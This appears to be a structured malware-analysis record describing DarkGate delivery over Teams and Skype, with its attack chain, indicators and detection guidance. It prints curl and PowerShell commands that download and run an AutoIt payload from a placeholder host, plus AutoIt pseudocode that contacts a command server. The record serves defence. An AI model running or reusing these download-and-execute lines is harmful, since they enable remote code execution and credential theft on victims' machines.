package_info.package_manager: N/A (delivered via messaging platforms, not a package manager)
package_info.why_malicious: DarkGate is a Windows-based malware distributed via social engineering on Teams and Skype, using malicious scripts and AutoIt to deliver a payload capable of remote access, file encryption, credential theft, and cryptocurrency mining. The entire package is malicious as it is designed to compromise endpoints, exfiltrate data, and perform unauthorized actions on victim systems.

execution_context.file_location: VBA script attached to Skype message (masquerading as PDF)

malicious_snippets.code_snippet: curl -o autoit.exe http://malicious-domain.com/autoit.exe && curl -o payload.au3 http://malicious-domain.com/payload.au3 && start autoit.exe payload.au3
malicious_snippets.code_behavior: Upon user execution, the script downloads a legitimate AutoIt binary and a malicious AutoIt script from a remote server, then executes the script using AutoIt, resulting in the execution of the DarkGate payload.

malice_analysis.why_suspicious: The script downloads executables and scripts from an external domain and immediately executes them, a common malware delivery technique.
malice_analysis.violated_expectations: Normal VBA/VBS scripts attached to business messages should not download and execute binaries from the internet.
malice_analysis.similar_legitimate_use: Automated software updaters may download and execute binaries, but only from trusted, verified sources.
key_indicators: Use of curl to download executables from non-corporate domains

malicious_snippets.code_snippet: powershell -Command "Invoke-WebRequest -Uri http://malicious-domain.com/autoit.exe -OutFile autoit.exe; Invoke-WebRequest -Uri http://malicious-domain.com/payload.au3 -OutFile payload.au3; Start-Process autoit.exe payload.au3"
malicious_snippets.code_behavior: When the LNK file is executed, it runs a PowerShell command that downloads both a legitimate AutoIt binary and a malicious AutoIt script, then executes the script to activate the DarkGate payload.

malice_analysis.why_suspicious: LNK files that execute PowerShell to download and run binaries are a well-known malware delivery vector.
malice_analysis.violated_expectations: LNK files in business communications should not trigger PowerShell downloads and execution of remote code.
malice_analysis.similar_legitimate_use: IT automation scripts may use similar commands, but not via unsolicited LNK files from external senders.
key_indicators: External domain used for payload delivery

malicious_snippets.code_snippet:
; AutoIt script pseudocode
Run('cmd.exe /c whoami > C:\temp\user.txt')
InetRead('http://malicious-domain.com/command')
; Steal credentials, mine crypto, encrypt files, etc.
malicious_snippets.code_behavior: At runtime, the malicious AutoIt script executes system commands, communicates with a remote command-and-control server, and performs actions such as credential theft, file encryption, and cryptocurrency mining.

malice_analysis.why_suspicious: The script performs unauthorized system access, remote command retrieval, and malicious post-exploitation activities.
malice_analysis.violated_expectations: Legitimate AutoIt scripts should not connect to external C2 servers or perform credential theft/encryption.
malice_analysis.similar_legitimate_use: Remote management tools may use AutoIt for automation, but not for malicious activities.
key_indicators: AutoIt script with obfuscated or malicious logic

attack_chain.action: Victim receives a malicious attachment (VBA script or LNK file) via Skype or Teams from a trusted or external sender.
attack_chain.leads_to: User executes the attachment, triggering the download of additional payloads.

attack_chain.action: Malicious script downloads a legitimate AutoIt binary and a malicious AutoIt script from an external server.
attack_chain.leads_to: Downloaded files are executed on the victim's system.

attack_chain.action: Malicious AutoIt script executes, performing credential theft, file encryption, crypto mining, and remote access.

behavioral_signatures: Messaging attachments (VBA, VBS, LNK) that download and execute binaries
AutoIt binary execution with external script payloads
AutoIt scripts making outbound network connections
PowerShell or curl used to fetch executables from non-corporate domains
file_indicators: Unexpected .LNK or .VBS attachments in Teams/Skype messages
Downloaded autoit.exe in user temp or downloads directory
payload.au3 or similar AutoIt script files
network_indicators: Outbound HTTP/S requests to unknown or suspicious domains (e.g., malicious-domain.com)
C2 communication patterns from AutoIt processes
detection_knowledge.how_to_detect: Monitor for messaging attachments containing scripts or LNK files that invoke PowerShell or curl to download executables. Flag execution of AutoIt binaries with non-standard script arguments, especially when sourced from user directories. Detect outbound network connections from AutoIt or PowerShell processes to untrusted domains. Alert on the presence of unexpected AutoIt scripts or binaries in user-accessible locations.
